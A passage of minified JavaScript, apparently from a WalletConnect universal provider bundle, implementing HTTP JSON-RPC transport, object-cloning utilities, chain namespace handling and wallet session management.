i=n.fetch?n:r;e=i.fetch,e.default=i.fetch,e.fetch=i.fetch,e.Headers=i.Headers,e.Request=i.Request,e.Response=i.Response,t.exports=e})(Z3,Z3.exports)),Z3.exports}var lPe=uPe();const bV=Vf(lPe);var dPe=Object.defineProperty,fPe=Object.defineProperties,hPe=Object.getOwnPropertyDescriptors,wV=Object.getOwnPropertySymbols,pPe=Object.prototype.hasOwnProperty,mPe=Object.prototype.propertyIsEnumerable,vV=(t,e,n)=>e in t?dPe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,EV=(t,e)=>{for(var n in e||(e={}))pPe.call(e,n)&&vV(t,n,e[n]);if(wV)for(var n of wV(e))mPe.call(e,n)&&vV(t,n,e[n]);return t},_V=(t,e)=>fPe(t,hPe(e));const gPe={Accept:"application/json","Content-Type":"application/json"},yPe="POST",AV={headers:gPe,method:yPe},CV=10;let rae=class{constructor(e,n=!1){if(this.url=e,this.disableProviderPing=n,this.events=new Wc.EventEmitter,this.isAvailable=!1,this.registering=!1,!Fq(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);this.url=e,this.disableProviderPing=n}get connected(){return this.isAvailable}get connecting(){return this.registering}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async open(e=this.url){await this.register(e)}async close(){if(!this.isAvailable)throw new Error("Connection already closed");this.onClose()}async send(e){this.isAvailable||await this.register();try{const n=Rf(e),r=await(await bV(this.url,_V(EV({},AV),{body:n}))).json();this.onPayload({data:r})}catch(n){this.onError(e.id,n)}}async register(e=this.url){if(!Fq(e))throw new Error(`Provided URL is not compatible with HTTP connection: ${e}`);if(this.registering){const n=this.events.getMaxListeners();return(this.events.listenerCount("register_error")>=n||this.events.listenerCount("open")>=n)&&this.events.setMaxListeners(n+1),new Promise((r,i)=>{this.events.once("register_error",s=>{this.resetMaxListeners(),i(s)}),this.events.once("open",()=>{if(this.resetMaxListeners(),typeof this.isAvailable>"u")return i(new Error("HTTP connection is missing or invalid"));r()})})}this.url=e,this.registering=!0;try{if(!this.disableProviderPing){const n=Rf({id:1,jsonrpc:"2.0",method:"test",params:[]});await bV(e,_V(EV({},AV),{body:n}))}this.onOpen()}catch(n){const r=this.parseError(n);throw this.events.emit("register_error",r),this.onClose(),r}}onOpen(){this.isAvailable=!0,this.registering=!1,this.events.emit("open")}onClose(){this.isAvailable=!1,this.registering=!1,this.events.emit("close")}onPayload(e){if(typeof e.data>"u")return;const n=typeof e.data=="string"?sg(e.data):e.data;this.events.emit("payload",n)}onError(e,n){const r=this.parseError(n),i=r.message||r.toString(),s=s8(e,i);this.events.emit("payload",s)}parseError(e,n=this.url){return Doe(e,n,"HTTP")}resetMaxListeners(){this.events.getMaxListeners()>CV&&this.events.setMaxListeners(CV)}};function $B(t){return t==null||typeof t!="object"&&typeof t!="function"}function iae(t){return Object.getOwnPropertySymbols(t).filter(e=>Object.prototype.propertyIsEnumerable.call(t,e))}function sae(t){return t==null?t===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(t)}const bPe="[object RegExp]",oae="[object String]",aae="[object Number]",cae="[object Boolean]",uae="[object Arguments]",wPe="[object Symbol]",vPe="[object Date]",EPe="[object Map]",_Pe="[object Set]",APe="[object Array]",CPe="[object ArrayBuffer]",SPe="[object Object]",TPe="[object DataView]",xPe="[object Uint8Array]",IPe="[object Uint8ClampedArray]",RPe="[object Uint16Array]",PPe="[object Uint32Array]",NPe="[object Int8Array]",OPe="[object Int16Array]",kPe="[object Int32Array]",DPe="[object Float32Array]",BPe="[object Float64Array]";function HB(t){return ArrayBuffer.isView(t)&&!(t instanceof DataView)}function jPe(t,e){return Vb(t,void 0,t,new Map,e)}function Vb(t,e,n,r=new Map,i=void 0){const s=i?.(t,e,n,r);if(s!=null)return s;if($B(t))return t;if(r.has(t))return r.get(t);if(Array.isArray(t)){const o=new Array(t.length);r.set(t,o);for(let a=0;a<t.length;a++)o[a]=Vb(t[a],a,n,r,i);return Object.hasOwn(t,"index")&&(o.index=t.index),Object.hasOwn(t,"input")&&(o.input=t.input),o}if(t instanceof Date)return new Date(t.getTime());if(t instanceof RegExp){const o=new RegExp(t.source,t.flags);return o.lastIndex=t.lastIndex,o}if(t instanceof Map){const o=new Map;r.set(t,o);for(const[a,c]of t)o.set(a,Vb(c,a,n,r,i));return o}if(t instanceof Set){const o=new Set;r.set(t,o);for(const a of t)o.add(Vb(a,void 0,n,r,i));return o}if(typeof Buffer<"u"&&Buffer.isBuffer(t))return t.subarray();if(HB(t)){const o=new(Object.getPrototypeOf(t)).constructor(t.length);r.set(t,o);for(let a=0;a<t.length;a++)o[a]=Vb(t[a],a,n,r,i);return o}if(t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer)return t.slice(0);if(t instanceof DataView){const o=new DataView(t.buffer.slice(0),t.byteOffset,t.byteLength);return r.set(t,o),Im(o,t,n,r,i),o}if(typeof File<"u"&&t instanceof File){const o=new File([t],t.name,{type:t.type});return r.set(t,o),Im(o,t,n,r,i),o}if(t instanceof Blob){const o=new Blob([t],{type:t.type});return r.set(t,o),Im(o,t,n,r,i),o}if(t instanceof Error){const o=new t.constructor;return r.set(t,o),o.message=t.message,o.name=t.name,o.stack=t.stack,o.cause=t.cause,Im(o,t,n,r,i),o}if(typeof t=="object"&&MPe(t)){const o=Object.create(Object.getPrototypeOf(t));return r.set(t,o),Im(o,t,n,r,i),o}return t}function Im(t,e,n=t,r,i){const s=[...Object.keys(e),...iae(e)];for(let o=0;o<s.length;o++){const a=s[o],c=Object.getOwnPropertyDescriptor(t,a);(c==null||c.writable)&&(t[a]=Vb(e[a],a,n,r,i))}}function MPe(t){switch(sae(t)){case uae:case APe:case CPe:case TPe:case cae:case vPe:case DPe:case BPe:case NPe:case OPe:case kPe:case EPe:case aae:case SPe:case bPe:case _Pe:case oae:case wPe:case xPe:case IPe:case RPe:case PPe:return!0;default:return!1}}function UPe(t,e){return jPe(t,(n,r,i,s)=>{if(typeof t=="object")switch(Object.prototype.toString.call(t)){case aae:case oae:case cae:{const o=new t.constructor(t?.valueOf());return Im(o,t),o}case uae:{const o={};return Im(o,t),o.length=t.length,o[Symbol.iterator]=t[Symbol.iterator],o}default:return}})}function SV(t){return UPe(t)}function TV(t){return t!==null&&typeof t=="object"&&sae(t)==="[object Arguments]"}function xV(t){return typeof t=="object"&&t!==null}function LPe(){}function FPe(t){return HB(t)}function $Pe(t){if(typeof t!="object"||t==null)return!1;if(Object.getPrototypeOf(t)===null)return!0;if(Object.prototype.toString.call(t)!=="[object Object]"){const n=t[Symbol.toStringTag];return n==null||!Object.getOwnPropertyDescriptor(t,Symbol.toStringTag)?.writable?!1:t.toString()===`[object ${n}]`}let e=t;for(;Object.getPrototypeOf(e)!==null;)e=Object.getPrototypeOf(e);return Object.getPrototypeOf(t)===e}function HPe(t){if($B(t))return t;if(Array.isArray(t)||HB(t)||t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer)return t.slice(0);const e=Object.getPrototypeOf(t),n=e.constructor;if(t instanceof Date||t instanceof Map||t instanceof Set)return new n(t);if(t instanceof RegExp){const r=new n(t);return r.lastIndex=t.lastIndex,r}if(t instanceof DataView)return new n(t.buffer.slice(0));if(t instanceof Error){const r=new n(t.message);return r.stack=t.stack,r.name=t.name,r.cause=t.cause,r}if(typeof File<"u"&&t instanceof File)return new n([t],t.name,{type:t.type,lastModified:t.lastModified});if(typeof t=="object"){const r=Object.create(e);return Object.assign(r,t)}return t}function zPe(t,...e){const n=e.slice(0,-1),r=e[e.length-1];let i=t;for(let s=0;s<n.length;s++){const o=n[s];i=N7(i,o,r,new Map)}return i}function N7(t,e,n,r){if($B(t)&&(t=Object(t)),e==null||typeof e!="object")return t;if(r.has(e))return HPe(r.get(e));if(r.set(e,t),Array.isArray(e)){e=e.slice();for(let s=0;s<e.length;s++)e[s]=e[s]??void 0}const i=[...Object.keys(e),...iae(e)];for(let s=0;s<i.length;s++){const o=i[s];let a=e[o],c=t[o];if(TV(a)&&(a={...a}),TV(c)&&(c={...c}),typeof Buffer<"u"&&Buffer.isBuffer(a)&&(a=SV(a)),Array.isArray(a))if(typeof c=="object"&&c!=null){const f=[],h=Reflect.ownKeys(c);for(let m=0;m<h.length;m++){const b=h[m];f[b]=c[b]}c=f}else c=[];const l=n(c,a,o,t,e,r);l!=null?t[o]=l:Array.isArray(a)||xV(c)&&xV(a)?t[o]=N7(c,a,n,r):c==null&&$Pe(a)?t[o]=N7({},a,n,r):c==null&&FPe(a)?t[o]=SV(a):(c===void 0||a!==void 0)&&(t[o]=a)}return t}function qPe(t,...e){return zPe(t,...e,LPe)}const IV="error",VPe="wss://relay.walletconnect.org",WPe="wc",lae="universal_provider",Y3=`${WPe}@2:${lae}:`,dae="https://rpc.walletconnect.org/v1/",fae="generic",GPe=`${dae}bundler`,n1="call_status",KPe=86400,zB={DEFAULT_CHAIN_CHANGED:"default_chain_changed"};var ZPe=Object.defineProperty,YPe=Object.defineProperties,QPe=Object.getOwnPropertyDescriptors,RV=Object.getOwnPropertySymbols,JPe=Object.prototype.hasOwnProperty,XPe=Object.prototype.propertyIsEnumerable,PV=(t,e,n)=>e in t?ZPe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Q3=(t,e)=>{for(var n in e||(e={}))JPe.call(e,n)&&PV(t,n,e[n]);if(RV)for(var n of RV(e))XPe.call(e,n)&&PV(t,n,e[n]);return t},eNe=(t,e)=>YPe(t,QPe(e));function hae(t,e,n){var r;const i=_f(t);return((r=e.rpcMap)==null?void 0:r[i.reference])||`${dae}?chainId=${i.namespace}:${i.reference}&projectId=${n}`}function tNe(t){return t.includes(":")?t.split(":")[1]:t}function pae(t){return t.map(e=>`${e.split(":")[0]}:${e.split(":")[1]}`)}function nNe(t,e){const n=Object.keys(e.namespaces).filter(i=>i.includes(t));if(!n.length)return[];const r=[];return n.forEach(i=>{const s=e.namespaces[i].accounts;r.push(...s)}),r}function NV(t){return Object.fromEntries(Object.entries(t).filter(([e,n])=>{var r,i;return((r=n?.chains)==null?void 0:r.length)&&((i=n?.chains)==null?void 0:i.length)>0}))}function J3(t={},e={}){const n=NV(OV(t)),r=NV(OV(e));return qPe(n,r)}function OV(t){var e,n,r,i,s;const o={};if(!Fl(t))return o;for(const[a,c]of Object.entries(t)){const l=i8(a)?[a]:c.chains,f=c.methods||[],h=c.events||[],m=c.rpcMap||{},b=qb(a);o[b]=eNe(Q3(Q3({},o[b]),c),{chains:Ll(l,(e=o[b])==null?void 0:e.chains),methods:Ll(f,(n=o[b])==null?void 0:n.methods),events:Ll(h,(r=o[b])==null?void 0:r.events)}),(Fl(m)||Fl(((i=o[b])==null?void 0:i.rpcMap)||{}))&&(o[b].rpcMap=Q3(Q3({},m),(s=o[b])==null?void 0:s.rpcMap))}return o}function kV(t){return t.includes(":")?t.split(":")[2]:t}function DV(t){const e={};for(const[n,r]of Object.entries(t)){const i=r.methods||[],s=r.events||[],o=r.accounts||[],a=i8(n)?[n]:r.chains?r.chains:pae(r.accounts);e[n]={chains:a,methods:i,events:s,accounts:o}}return e}function B9(t){return typeof t=="number"?t:t.includes("0x")?parseInt(t,16):(t=t.includes(":")?t.split(":")[1]:t,isNaN(Number(t))?t:Number(t))}function rNe(t){try{const e=JSON.parse(t);return typeof e=="object"&&e!==null&&!Array.isArray(e)}catch{return!1}}const mae={},r1=t=>mae[t],j9=(t,e)=>{mae[t]=e};var iNe=Object.defineProperty,BV=Object.getOwnPropertySymbols,sNe=Object.prototype.hasOwnProperty,oNe=Object.prototype.propertyIsEnumerable,jV=(t,e,n)=>e in t?iNe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,MV=(t,e)=>{for(var n in e||(e={}))sNe.call(e,n)&&jV(t,n,e[n]);if(BV)for(var n of BV(e))oNe.call(e,n)&&jV(t,n,e[n]);return t};const UV="eip155",aNe=["atomic","flow-control","paymasterService","sessionKeys","auxiliaryFunds"],cNe=t=>t&&t.startsWith("0x")?BigInt(t).toString(10):t,M9=t=>t&&t.startsWith("0x")?t:`0x${BigInt(t).toString(16)}`,LV=t=>Object.keys(t).filter(e=>aNe.includes(e)).reduce((e,n)=>(e[n]=uNe(t[n]),e),{}),uNe=t=>typeof t=="string"&&rNe(t)?JSON.parse(t):t,lNe=(t,e,n)=>{const{sessionProperties:r={},scopedProperties:i={}}=t,s={};if(!Fl(i)&&!Fl(r))return;const o=LV(r);for(const a of n){const c=cNe(a);if(!c)continue;s[M9(c)]=o;const l=i?.[`${UV}:${c}`];if(l){const f=l?.[`${UV}:${c}:${e}`];s[M9(c)]=MV(MV({},s[M9(c)]),LV(f||l))}}for(const[a,c]of Object.entries(s))Object.keys(c).length===0&&delete s[a];return Object.keys(s).length>0?s:void 0};var dNe=Object.defineProperty,fNe=(t,e,n)=>e in t?dNe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,hNe=(t,e,n)=>fNe(t,e+"",n);let U9,pNe=class gae{constructor(e){hNe(this,"storage"),this.storage=e}async getItem(e){return await this.storage.getItem(e)}async setItem(e,n){return await this.storage.setItem(e,n)}async removeItem(e){return await this.storage.removeItem(e)}static getStorage(e){return U9||(U9=new gae(e)),U9}};var mNe=Object.defineProperty,gNe=Object.defineProperties,yNe=Object.getOwnPropertyDescriptors,FV=Object.getOwnPropertySymbols,bNe=Object.prototype.hasOwnProperty,wNe=Object.prototype.propertyIsEnumerable,$V=(t,e,n)=>e in t?mNe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,vNe=(t,e)=>{for(var n in e||(e={}))bNe.call(e,n)&&$V(t,n,e[n]);if(FV)for(var n of FV(e))wNe.call(e,n)&&$V(t,n,e[n]);return t},ENe=(t,e)=>gNe(t,yNe(e));async function _Ne(t,e){const n=_f(t.result.capabilities.caip345.caip2),r=t.result.capabilities.caip345.transactionHashes,i=await Promise.allSettled(r.map(h=>ANe(n.reference,h,e))),s=i.filter(h=>h.status==="fulfilled").map(h=>h.value).filter(h=>h);i.filter(h=>h.status==="rejected").forEach(h=>console.warn("Failed to fetch transaction receipt:",h.reason));const o=!s.length||s.some(h=>!h),a=s.every(h=>h?.status==="0x1"),c=s.every(h=>h?.status==="0x0"),l=s.some(h=>h?.status==="0x0");let f;return o?f=100:a?f=200:c?f=500:l&&(f=600),{id:t.result.id,version:t.request.version,atomic:t.request.atomicRequired,chainId:t.request.chainId,capabilities:t.result.capabilities,receipts:s,status:f}}async function ANe(t,e,n){return await n(parseInt(t)).request(Iu("eth_getTransactionReceipt",[e]))}async function CNe({sendCalls:t,storage:e}){const n=await e.getItem(n1);await e.setItem(n1,ENe(vNe({},n),{[t.result.id]:{request:t.request,result:t.result,expiry:Ii(KPe)}}))}async function SNe({resultId:t,storage:e}){const n=await e.getItem(n1);if(n){delete n[t],await e.setItem(n1,n);for(const r in n)Ol(n[r].expiry)&&delete n[r];await e.setItem(n1,n)}}async function TNe({resultId:t,storage:e}){const n=await e.getItem(n1),r=n?.[t];if(r&&!Ol(r.expiry))return r;await SNe({resultId:t,storage:e})}var xNe=Object.defineProperty,INe=Object.defineProperties,RNe=Object.getOwnPropertyDescriptors,HV=Object.getOwnPropertySymbols,PNe=Object.prototype.hasOwnProperty,NNe=Object.prototype.propertyIsEnumerable,O7=(t,e,n)=>e in t?xNe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,L9=(t,e)=>{for(var n in e||(e={}))PNe.call(e,n)&&O7(t,n,e[n]);if(HV)for(var n of HV(e))NNe.call(e,n)&&O7(t,n,e[n]);return t},F9=(t,e)=>INe(t,RNe(e)),Y0=(t,e,n)=>O7(t,typeof e!="symbol"?e+"":e,n);let ONe=class{constructor(e){Y0(this,"name","eip155"),Y0(this,"client"),Y0(this,"chainId"),Y0(this,"namespace"),Y0(this,"httpProviders"),Y0(this,"events"),Y0(this,"storage"),this.namespace=e.namespace,this.events=r1("events"),this.client=r1("client"),this.httpProviders=this.createHttpProviders(),this.chainId=parseInt(this.getDefaultChain()),this.storage=pNe.getStorage(this.client.core.storage)}async request(e){switch(e.request.method){case"eth_requestAccounts":return this.getAccounts();case"eth_accounts":return this.getAccounts();case"wallet_switchEthereumChain":return await this.handleSwitchChain(e);case"eth_chainId":return parseInt(this.getDefaultChain());case"wallet_getCapabilities":return await this.getCapabilities(e);case"wallet_getCallsStatus":return await this.getCallStatus(e);case"wallet_sendCalls":return await this.sendCalls(e)}return this.namespace.methods.includes(e.request.method)?await this.client.request(e):this.getHttpProvider().request(e.request)}updateNamespace(e){this.namespace=Object.assign(this.namespace,e)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(parseInt(e),n);const r=this.chainId;this.chainId=parseInt(e),this.events.emit(zB.DEFAULT_CHAIN_CHANGED,{currentCaipChainId:`${this.name}:${e}`,previousCaipChainId:`${this.name}:${r}`})}requestAccounts(){return this.getAccounts()}getDefaultChain(){if(this.chainId)return this.chainId.toString();if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}createHttpProvider(e,n){const r=n||hae(`${this.name}:${e}`,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new UB(new rae(r,r1("disableProviderPing")))}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProviders(){const e={};return this.namespace.chains.forEach(n=>{var r;const i=parseInt(tNe(n));e[i]=this.createHttpProvider(i,(r=this.namespace.rpcMap)==null?void 0:r[n])}),e}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}getHttpProvider(e){const n=e||this.chainId;return this.httpProviders[n]||(this.httpProviders=F9(L9({},this.httpProviders),{[n]:this.createHttpProvider(n)}),this.httpProviders[n])}async handleSwitchChain(e){var n,r;let i=e.request.params?(n=e.request.params[0])==null?void 0:n.chainId:"0x0";i=i.startsWith("0x")?i:`0x${i}`;const s=parseInt(i,16);if(this.isChainApproved(s))this.setDefaultChain(`${s}`);else if(this.namespace.methods.includes("wallet_switchEthereumChain"))await this.client.request({topic:e.topic,request:{method:e.request.method,params:[{chainId:i}]},chainId:(r=this.namespace.chains)==null?void 0:r[0]}),this.setDefaultChain(`${s}`);else throw new Error(`Failed to switch to chain 'eip155:${s}'. The chain is not approved or the wallet does not support 'wallet_switchEthereumChain' method.`);return null}isChainApproved(e){return this.namespace.chains.includes(`${this.name}:${e}`)}async getCapabilities(e){var n,r,i,s,o;const a=(r=(n=e.request)==null?void 0:n.params)==null?void 0:r[0],c=((s=(i=e.request)==null?void 0:i.params)==null?void 0:s[1])||[];if(!a)throw new Error("Missing address parameter in `wallet_getCapabilities` request");const l=this.client.session.get(e.topic),f=((o=l?.sessionProperties)==null?void 0:o.capabilities)||{},h=`${a}${c.join(",")}`,m=f?.[h];if(m)return m;let b;try{b=lNe(l,a,c)}catch(y){console.warn("Failed to extract capabilities from session",y)}if(b)return b;const w=await this.client.request(e);try{await this.client.session.update(e.topic,{sessionProperties:F9(L9({},l.sessionProperties||{}),{capabilities:F9(L9({},f||{}),{[h]:w})})})}catch(y){console.warn("Failed to update session with capabilities",y)}return w}async getCallStatus(e){var n,r,i;const s=this.client.session.get(e.topic),o=(n=s.sessionProperties)==null?void 0:n.bundler_name;if(o){const l=this.getBundlerUrl(e.chainId,o);try{return await this.getUserOperationReceipt(l,e)}catch(f){console.warn("Failed to fetch call status from bundler",f,l)}}const a=(r=s.sessionProperties)==null?void 0:r.bundler_url;if(a)try{return await this.getUserOperationReceipt(a,e)}catch(l){console.warn("Failed to fetch call status from custom bundler",l,a)}const c=await TNe({resultId:(i=e.request.params)==null?void 0:i[0],storage:this.storage});if(c)try{return await _Ne(c,this.getHttpProvider.bind(this))}catch(l){console.warn("Failed to fetch call status from stored send calls",l,c)}if(this.namespace.methods.includes(e.request.method))return await this.client.request(e);throw new Error("Fetching call status not approved by the wallet.")}async getUserOperationReceipt(e,n){var r;const i=new URL(e),s=await fetch(i,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(Iu("eth_getUserOperationReceipt",[(r=n.request.params)==null?void 0:r[0]]))});if(!s.ok)throw new Error(`Failed to fetch user operation receipt - ${s.status}`);return await s.json()}getBundlerUrl(e,n){return`${GPe}?projectId=${this.client.core.projectId}&chainId=${e}&bundler=${n}`}async sendCalls(e){var n,r,i;const s=await this.client.request(e),o=(n=e.request.params)==null?void 0:n[0],a=s?.id,c=s?.capabilities||{},l=(r=c?.caip345)==null?void 0:r.caip2,f=(i=c?.caip345)==null?void 0:i.transactionHashes;return!a||!l||!(f!=null&&f.length)||await CNe({sendCalls:{request:o,result:s},storage:this.storage}),s}};var kNe=Object.defineProperty,DNe=(t,e,n)=>e in t?kNe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,ub=(t,e,n)=>DNe(t,typeof e!="symbol"?e+"":e,n);let BNe=class{constructor(e){ub(this,"name",fae),ub(this,"client"),ub(this,"httpProviders"),ub(this,"events"),ub(this,"namespace"),ub(this,"chainId"),this.namespace=e.namespace,this.events=r1("events"),this.client=r1("client"),this.chainId=this.getDefaultChain(),this.name=this.getNamespaceName(),this.httpProviders=this.createHttpProviders()}updateNamespace(e){this.namespace.chains=[...new Set((this.namespace.chains||[]).concat(e.chains||[]))],this.namespace.accounts=[...new Set((this.namespace.accounts||[]).concat(e.accounts||[]))],this.namespace.methods=[...new Set((this.namespace.methods||[]).concat(e.methods||[]))],this.namespace.events=[...new Set((this.namespace.events||[]).concat(e.events||[]))],this.httpProviders=this.createHttpProviders()}requestAccounts(){return this.getAccounts()}request(e){return this.namespace.methods.includes(e.request.method)?this.client.request(e):this.getHttpProvider(e.chainId).request(e.request)}setDefaultChain(e,n){this.httpProviders[e]||this.setHttpProvider(e,n);const r=this.chainId;this.chainId=e,this.events.emit(zB.DEFAULT_CHAIN_CHANGED,{currentCaipChainId:`${this.name}:${e}`,previousCaipChainId:`${this.name}:${r}`})}getDefaultChain(){if(this.chainId)return this.chainId;if(this.namespace.defaultChain)return this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getNamespaceName(){const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return _f(e).namespace}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}createHttpProviders(){var e,n;const r={};return(n=(e=this.namespace)==null?void 0:e.accounts)==null||n.forEach(i=>{var s,o;const a=_f(i),c=(o=(s=this.namespace)==null?void 0:s.rpcMap)==null?void 0:o[`${a.namespace}:${a.reference}`];r[a.reference]=this.createHttpProvider(i,c)}),r}getHttpProvider(e){const n=_f(e).reference,r=this.httpProviders[n];if(typeof r>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return r}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||hae(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new UB(new rae(r,r1("disableProviderPing")))}};var jNe=Object.defineProperty,MNe=Object.defineProperties,UNe=Object.getOwnPropertyDescriptors,zV=Object.getOwnPropertySymbols,LNe=Object.prototype.hasOwnProperty,FNe=Object.prototype.propertyIsEnumerable,k7=(t,e,n)=>e in t?jNe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,kv=(t,e)=>{for(var n in e||(e={}))LNe.call(e,n)&&k7(t,n,e[n]);if(zV)for(var n of zV(e))FNe.call(e,n)&&k7(t,n,e[n]);return t},X3=(t,e)=>MNe(t,UNe(e)),ka=(t,e,n)=>k7(t,typeof e!="symbol"?e+"":e,n);let $Ne=class yae{constructor(e){ka(this,"client"),ka(this,"namespaces"),ka(this,"optionalNamespaces"),ka(this,"sessionProperties"),ka(this,"scopedProperties"),ka(this,"events",new oB),ka(this,"rpcProviders",{}),ka(this,"session"),ka(this,"providerOpts"),ka(this,"logger"),ka(this,"uri"),ka(this,"disableProviderPing",!1),ka(this,"connectParams");var n,r;this.providerOpts=e,this.logger=BB({logger:(n=e.logger)!=null?n:IV,name:(r=this.providerOpts.name)!=null?r:lae}),this.disableProviderPing=e?.disableProviderPing||!1}static async init(e){const n=new yae(e);return await n.initialize(),n}async request(e,n,r){const[i,s]=this.validateChain(n);if(!this.session)throw new Error("Please call connect() before request()");return await this.getProvider(i).request({request:kv({},e),chainId:`${i}:${s}`,topic:this.session.topic,expiry:r})}sendAsync(e,n,r,i){const s=new Date().getTime();this.request(e,r,i).then(o=>n(null,d_(s,o))).catch(o=>n(o,void 0))}async enable(){if(!this.client)throw new Error("Sign Client not initialized");return this.session||await this.connect({namespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties}),await this.requestAccounts()}async disconnect(){var e;if(!this.session)throw new Error("Please call connect() before enable()");await this.client.disconnect({topic:(e=this.session)==null?void 0:e.topic,reason:Ur("USER_DISCONNECTED")}),await this.cleanup()}async connect(e){if(!this.client)throw new Error("Sign Client not initialized");if(this.connectParams=e,this.setNamespaces(e),this.cleanupPendingPairings(),!e.skipPairing)return await this.pair(e.pairingTopic)}async authenticate(e,n){if(!this.client)throw new Error("Sign Client not initialized");this.setNamespaces(e),await this.cleanupPendingPairings();const{uri:r,response:i}=await this.client.authenticate(e,n);r&&(this.uri=r,this.events.emit("display_uri",r));const s=await i();if(this.session=s.session,this.session){const o=DV(this.session.namespaces);this.namespaces=J3(this.namespaces,o),await this.persist("namespaces",this.namespaces),this.onConnect()}return s}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}removeListener(e,n){this.events.removeListener(e,n)}off(e,n){this.events.off(e,n)}get isWalletConnect(){return!0}async pair(e){var n,r;const{uri:i,approval:s}=await this.client.connect({pairingTopic:e,requiredNamespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties,authentication:(n=this.connectParams)==null?void 0:n.authentication,walletPay:(r=this.connectParams)==null?void 0:r.walletPay});i&&(this.uri=i,this.events.emit("display_uri",i));const o=await s();this.session=o;const a=DV(o.namespaces);return this.namespaces=J3(this.namespaces,a),await this.persist("namespaces",this.namespaces),await this.persist("optionalNamespaces",this.optionalNamespaces),this.onConnect(),this.session}setDefaultChain(e,n){try{if(!this.session)return;const[r,i]=this.validateChain(e);this.getProvider(r).setDefaultChain(i,n)}catch(r){if(!/Please call connect/.test(r.message))throw r}}async cleanupPendingPairings(e={}){try{this.logger.info("Cleaning up inactive pairings...");const n=this.client.pairing.getAll();if(!Cf(n))return;for(const r of n)e.deletePairings?this.client.core.expirer.set(r.topic,0):await this.client.core.relayer.subscriber.unsubscribe(r.topic);this.logger.info(`Inactive pairings cleared: ${n.length}`)}catch(n){this.logger.warn(n,"Failed to cleanup pending pairings")}}abortPairingAttempt(){this.logger.warn("abortPairingAttempt is deprecated. This is now a no-op.")}async checkStorage(){this.namespaces=await this.getFromStore("namespaces")||{},this.optionalNamespaces=await this.getFromStore("optionalNamespaces")||{},this.session&&this.createProviders()}async initialize(){this.logger.trace("Initialized"),await this.createClient(),await this.checkStorage(),this.registerEventListeners()}async createClient(){var e,n;if(this.client=this.providerOpts.client||await cPe.init({core:this.providerOpts.core,logger:this.providerOpts.logger||IV,relayUrl:this.providerOpts.relayUrl||VPe,projectId:this.providerOpts.projectId,metadata:this.providerOpts.metadata,storageOptions:this.providerOpts.storageOptions,storage:this.providerOpts.storage,name:this.providerOpts.name,customStoragePrefix:this.providerOpts.customStoragePrefix,telemetryEnabled:this.providerOpts.telemetryEnabled}),this.providerOpts.session)try{this.session=this.client.session.get(this.providerOpts.session.topic)}catch(r){throw this.logger.error(r,"Failed to get session"),new Error(`The provided session: ${(n=(e=this.providerOpts)==null?void 0:e.session)==null?void 0:n.topic} doesn't exist in the Sign client`)}else{const r=this.client.session.getAll();this.session=r[0]}this.logger.trace("SignClient Initialized")}createProviders(){if(!this.client)throw new Error("Sign Client not initialized");if(!this.session)throw new Error("Session not initialized. Please call connect() before enable()");const e=[...new Set(Object.keys(this.session.namespaces).map(n=>qb(n)))];j9("client",this.client),j9("events",this.events),j9("disableProviderPing",this.disableProviderPing),e.forEach(n=>{if(!this.session)return;const r=nNe(n,this.session);if(r?.length===0)return;const i=pae(r),s=J3(this.namespaces,this.optionalNamespaces),o=X3(kv({},s[n]),{accounts:r,chains:i});switch(n){case"eip155":this.rpcProviders[n]=new ONe({namespace:o});break;default:this.rpcProviders[n]=new BNe({namespace:o})}})}registerEventListeners(){if(typeof this.client>"u")throw new Error("Sign Client is not initialized");this.client.on("session_ping",e=>{var n;const{topic:r}=e;r===((n=this.session)==null?void 0:n.topic)&&this.events.emit("session_ping",e)}),this.client.on("session_event",e=>{var n;const{params:r,topic:i}=e;if(i!==((n=this.session)==null?void 0:n.topic))return;const{event:s}=r;if(s.name==="accountsChanged"){const o=s.data;o&&Cf(o)&&this.events.emit("accountsChanged",o.map(kV))}else if(s.name==="chainChanged"){const o=r.chainId,a=r.event.data,c=qb(o),l=B9(o)!==B9(a)?`${c}:${B9(a)}`:o;this.onChainChanged({currentCaipChainId:l})}else this.events.emit(s.name,s.data);this.events.emit("session_event",e)}),this.client.on("session_update",({topic:e,params:n})=>{var 